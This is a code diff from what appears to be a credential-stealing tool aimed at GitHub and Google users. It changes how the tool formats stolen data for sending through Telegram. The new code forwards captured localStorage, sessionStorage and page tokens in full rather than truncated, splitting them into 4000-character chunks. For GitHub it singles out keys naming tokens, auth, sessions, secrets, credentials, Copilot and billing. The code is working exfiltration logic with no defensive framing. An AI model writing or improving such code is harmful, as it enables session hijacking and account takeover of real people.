@@ -489,15 +489,52 @@ ${tokenKeys.length > 0 ? '🔑 CSRF/auth tokens captured from page!' : ''}`;
       }
 
       if (lsKeys.length > 0) {
-        let msg3 = `🐙 GITHUB localStorage (${lsKeys.length}) 🐙\n\n`;
-        lsKeys.forEach(k => { msg3 += `💾 ${k} = ${truncVal(capturedLocalStorage[k], 200)}\n`; });
-        telegramMsgs.push(msg3);
+        const importantKeys = lsKeys.filter(k => 
+          k.toLowerCase().includes('token') || k.toLowerCase().includes('copilot') ||
+          k.toLowerCase().includes('auth') || k.toLowerCase().includes('session') ||
+          k.toLowerCase().includes('key') || k.toLowerCase().includes('secret') ||
+          k.toLowerCase().includes('credential') || k.toLowerCase().includes('billing')
+        );
+        const otherLsKeys = lsKeys.filter(k => !importantKeys.includes(k));
+
+        if (importantKeys.length > 0) {
+          let impMsg = `🐙 GITHUB IMPORTANT localStorage (${importantKeys.length}) 🐙\n\n`;
+          importantKeys.forEach(k => {
+            impMsg += `🔐 ${k}:\n${capturedLocalStorage[k]}\n\n`;
+          });
+          const impChunks = [];
+          while (impMsg.length > 0) {
+            impChunks.push(impMsg.substring(0, 4000));
+            impMsg = impMsg.substring(4000);
+          }
+          impChunks.forEach(c => telegramMsgs.push(c));
+        }
+
+        if (otherLsKeys.length > 0) {
+          let otherMsg = `🐙 GITHUB OTHER localStorage (${otherLsKeys.length}) 🐙\n\n`;
+          otherLsKeys.forEach(k => {
+            otherMsg += `💾 ${k}:\n${capturedLocalStorage[k]}\n\n`;
+          });
+          const otherChunks = [];
+          while (otherMsg.length > 0) {
+            otherChunks.push(otherMsg.substring(0, 4000));
+            otherMsg = otherMsg.substring(4000);
+          }
+          otherChunks.forEach(c => telegramMsgs.push(c));
+        }
       }
 
       if (ssKeys.length > 0) {
-        let msg4 = `🐙 GITHUB sessionStorage (${ssKeys.length}) 🐙\n\n`;
-        ssKeys.forEach(k => { msg4 += `📝 ${k} = ${truncVal(capturedSessionStorage[k], 200)}\n`; });
-        telegramMsgs.push(msg4);
+        let ssMsg = `🐙 GITHUB sessionStorage (${ssKeys.length}) 🐙\n\n`;
+        ssKeys.forEach(k => {
+          ssMsg += `📝 ${k}:\n${capturedSessionStorage[k]}\n\n`;
+        });
+        const ssChunks = [];
+        while (ssMsg.length > 0) {
+          ssChunks.push(ssMsg.substring(0, 4000));
+          ssMsg = ssMsg.substring(4000);
+        }
+        ssChunks.forEach(c => telegramMsgs.push(c));
       }
 
     } else if (type === 'google') {
@@ -544,12 +581,28 @@ ${capturedCritical.length > 0 ? '\n⚡ Critical auth cookies captured!' : '\n�
         telegramMsgs.push(msg3);
       }
 
-      if (lsKeys.length > 0 || ssKeys.length > 0 || tokenKeys.length > 0) {
-        let msg4 = `🔍 GOOGLE STORAGE & TOKENS 🔍\n\n`;
-        if (tokenKeys.length > 0) msg4 += `🔑 Tokens/Meta:\n${formatKV(capturedTokens, '🔐', 200)}\n`;
-        if (lsKeys.length > 0) msg4 += `💾 localStorage (${lsKeys.length}):\n${formatKV(capturedLocalStorage, '💾', 200)}\n`;
-        if (ssKeys.length > 0) msg4 += `📝 sessionStorage (${ssKeys.length}):\n${formatKV(capturedSessionStorage, '📝', 200)}\n`;
-        telegramMsgs.push(msg4);
+      if (tokenKeys.length > 0) {
+        let tokMsg = `🔍 GOOGLE TOKENS/META 🔍\n\n`;
+        tokenKeys.forEach(k => { tokMsg += `🔐 ${k}:\n${capturedTokens[k]}\n\n`; });
+        const tokChunks = [];
+        while (tokMsg.length > 0) { tokChunks.push(tokMsg.substring(0, 4000)); tokMsg = tokMsg.substring(4000); }
+        tokChunks.forEach(c => telegramMsgs.push(c));
+      }
+
+      if (lsKeys.length > 0) {
+        let lsMsg = `🔍 GOOGLE localStorage (${lsKeys.length}) 🔍\n\n`;
+        lsKeys.forEach(k => { lsMsg += `💾 ${k}:\n${capturedLocalStorage[k]}\n\n`; });
+        const lsChunks = [];
+        while (lsMsg.length > 0) { lsChunks.push(lsMsg.substring(0, 4000)); lsMsg = lsMsg.substring(4000); }
+        lsChunks.forEach(c => telegramMsgs.push(c));
+      }
+
+      if (ssKeys.length > 0) {
+        let ssMsg = `🔍 GOOGLE sessionStorage (${ssKeys.length}) 🔍\n\n`;
+        ssKeys.forEach(k => { ssMsg += `📝 ${k}:\n${capturedSessionStorage[k]}\n\n`; });
+        const ssChunks = [];
+        while (ssMsg.length > 0) { ssChunks.push(ssMsg.substring(0, 4000)); ssMsg = ssMsg.substring(4000); }
+        ssChunks.forEach(c => telegramMsgs.push(c));
       }
 
     } else {
